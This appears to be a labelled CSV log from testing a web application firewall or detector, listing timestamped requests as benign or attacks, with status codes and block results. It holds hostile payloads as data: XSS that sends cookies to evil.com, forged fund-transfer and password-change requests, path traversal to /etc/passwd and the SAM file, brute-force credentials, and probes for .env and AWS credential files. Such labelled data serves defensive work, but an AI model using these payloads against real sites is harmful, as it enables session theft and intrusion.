timestamp,attack_type,payload_snippet,label,status_code,blocked
2026-07-04T22:07:48.757658,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
2026-07-04T22:07:49.402027,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
2026-07-04T22:07:50.183615,xss,<script>alert(document.cookie)</script>,1,403,True
2026-07-04T22:07:55.063528,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,403,True
2026-07-04T22:07:55.799047,xss,<input onfocus=alert(1) autofocus>,1,403,True
2026-07-04T22:07:59.723293,xss,<body onload=alert(1)>,1,403,True
2026-07-04T22:07:59.847430,benign,normal_request,0,200,False
2026-07-04T22:08:00.187619,benign,normal_request,0,401,False
2026-07-04T22:08:04.583519,benign,normal_request,0,403,False
2026-07-04T22:08:05.005832,benign,normal_request,0,200,False
2026-07-04T22:08:05.670937,benign,normal_request,0,401,False
2026-07-04T22:08:10.599539,benign,normal_request,0,403,False
2026-07-04T22:08:11.548473,benign,normal_request,0,403,False
2026-07-04T22:08:12.009837,benign,normal_request,0,401,False
2026-07-04T22:08:16.825056,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
2026-07-04T22:08:21.056247,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
2026-07-04T22:08:26.453917,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,N/A,False
2026-07-04T22:08:31.962997,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,N/A,False
2026-07-04T22:08:34.772972,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
2026-07-04T22:08:39.175691,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
2026-07-04T22:08:41.735866,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
2026-07-04T22:08:45.908932,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
2026-07-04T22:08:46.769740,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
2026-07-04T22:08:49.079956,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,403,True
2026-07-04T22:08:53.236122,benign,normal_request,0,403,False
2026-07-04T22:08:57.497373,benign,normal_request,0,403,False
2026-07-04T22:08:58.206042,benign,normal_request,0,200,False
2026-07-04T22:09:03.426137,benign,normal_request,0,N/A,False
2026-07-04T22:09:03.806117,benign,normal_request,0,401,False
2026-07-04T22:09:09.072208,benign,normal_request,0,403,False
2026-07-04T22:09:09.502205,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
2026-07-04T22:09:13.390988,path_traversal,....//....//....//etc/passwd,1,403,True
2026-07-04T22:09:17.888102,path_traversal,../../../etc/passwd,1,403,True
2026-07-04T22:09:23.115598,path_traversal,..\..\..\windows\system32\config\sam,1,N/A,False
2026-07-04T22:09:28.081584,path_traversal,....//....//....//etc/passwd,1,403,True
2026-07-04T22:09:32.768177,path_traversal,..\..\..\windows\system32\config\sam,1,403,True
2026-07-04T22:09:33.408464,path_traversal,..\..\..\windows\system32\config\sam,1,403,True
2026-07-04T22:09:37.743583,path_traversal,....//....//....//etc/passwd,1,403,True
2026-07-04T22:09:40.030362,path_traversal,/var/www/../../etc/passwd,1,403,True
2026-07-04T22:09:40.268924,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
2026-07-04T22:09:44.099916,benign,normal_request,0,403,False
2026-07-04T22:09:46.562109,benign,normal_request,0,403,False
2026-07-04T22:09:51.986375,benign,normal_request,0,N/A,False
2026-07-04T22:09:54.685997,benign,normal_request,0,403,False
2026-07-04T22:09:55.183138,benign,normal_request,0,401,False
2026-07-04T22:10:00.519218,benign,normal_request,0,403,False
2026-07-04T22:10:01.309281,benign,normal_request,0,200,False
2026-07-04T22:10:06.730127,benign,normal_request,0,N/A,False
2026-07-04T22:10:11.722192,brute_force,test:password,1,403,True
2026-07-04T22:10:12.435402,brute_force,user:letmein,1,403,True
2026-07-04T22:10:17.106693,brute_force,administrator:password,1,403,True
2026-07-04T22:10:17.667919,brute_force,admin:password,1,403,True
2026-07-04T22:10:22.119340,brute_force,administrator:password,1,403,True
2026-07-04T22:10:22.747329,brute_force,root:Admin@123,1,403,True
2026-07-04T22:10:23.315188,brute_force,user:123456,1,403,True
2026-07-04T22:10:27.979945,brute_force,administrator:letmein,1,403,True
2026-07-04T22:10:28.569175,brute_force,user:Admin@123,1,403,True
2026-07-04T22:10:33.720547,brute_force,test:password,1,N/A,False
2026-07-04T22:10:38.915538,brute_force,user:123456,1,N/A,False
2026-07-04T22:10:44.028692,brute_force,root:admin123,1,N/A,False
2026-07-04T22:10:49.262663,brute_force,test:password,1,N/A,False
2026-07-04T22:10:54.440793,brute_force,administrator:admin123,1,N/A,False
2026-07-04T22:10:57.833351,brute_force,user:password,1,403,True
2026-07-04T22:10:58.640047,brute_force,root:Admin@123,1,403,True
2026-07-04T22:10:59.252292,brute_force,test:admin123,1,403,True
2026-07-04T22:11:00.113746,brute_force,admin:admin123,1,403,True
2026-07-04T22:11:04.297838,brute_force,admin:password,1,403,True
2026-07-04T22:11:08.664430,brute_force,administrator:Admin@123,1,403,True
2026-07-04T22:11:12.924917,brute_force,user:Admin@123,1,403,True
2026-07-04T22:11:17.244941,brute_force,admin:password,1,403,True
2026-07-04T22:11:17.894003,brute_force,user:letmein,1,403,True
2026-07-04T22:11:22.010465,brute_force,test:letmein,1,403,True
2026-07-04T22:11:22.642778,brute_force,user:letmein,1,403,True
2026-07-04T22:11:22.822125,benign,normal_request,0,200,False
2026-07-04T22:11:27.179267,benign,normal_request,0,403,False
2026-07-04T22:11:27.627225,benign,normal_request,0,200,False
2026-07-04T22:11:31.717816,benign,normal_request,0,403,False
2026-07-04T22:11:32.315127,benign,normal_request,0,200,False
2026-07-04T22:11:33.255205,benign,normal_request,0,401,False
2026-07-04T22:11:37.625304,benign,normal_request,0,403,False
2026-07-04T22:11:37.889256,benign,normal_request,0,401,False
2026-07-04T22:11:38.328334,benign,normal_request,0,200,False
2026-07-04T22:11:38.620389,benign,normal_request,0,200,False
2026-07-04T22:11:41.564131,recon,/.git/HEAD,1,403,True
2026-07-04T22:11:43.795074,recon,/.aws/credentials,1,403,True
2026-07-04T22:11:44.022051,recon,/.git/HEAD,1,404,True
2026-07-04T22:11:46.373013,recon,/data/users.json,1,403,True
2026-07-04T22:11:48.472181,recon,/.env,1,403,True
2026-07-04T22:11:50.808465,recon,/.aws/credentials,1,403,True
2026-07-04T22:11:51.327008,recon,/.env,1,403,True
2026-07-04T22:11:53.565684,recon,/db/virex.db,1,500,False
2026-07-04T22:11:54.176605,recon,/backup.sql,1,500,False
2026-07-04T22:11:57.805522,recon,/web.config,1,403,True
2026-07-04T22:11:58.652717,recon,/db/virex.db,1,500,False
2026-07-04T22:12:00.793631,recon,/api/swagger.json,1,403,True
2026-07-04T22:12:01.481178,recon,/web.config,1,500,False
2026-07-04T22:12:01.663696,recon,/backup.sql,1,404,True
2026-07-04T22:12:02.505731,recon,/.aws/credentials,1,500,False
2026-07-04T22:12:02.708204,benign,normal_request,0,200,False
2026-07-04T22:12:03.150334,benign,normal_request,0,200,False
2026-07-04T22:12:07.271983,benign,normal_request,0,403,False
2026-07-04T22:12:07.686547,benign,normal_request,0,200,False
2026-07-04T22:12:08.323526,benign,normal_request,0,200,False
2026-07-04T22:12:09.104398,benign,normal_request,0,200,False
2026-07-04T22:12:14.476327,benign,normal_request,0,403,False
2026-07-04T22:12:15.009817,benign,normal_request,0,401,False
2026-07-04T22:12:19.564430,benign,normal_request,0,403,False
2026-07-04T22:12:20.320840,benign,normal_request,0,200,False
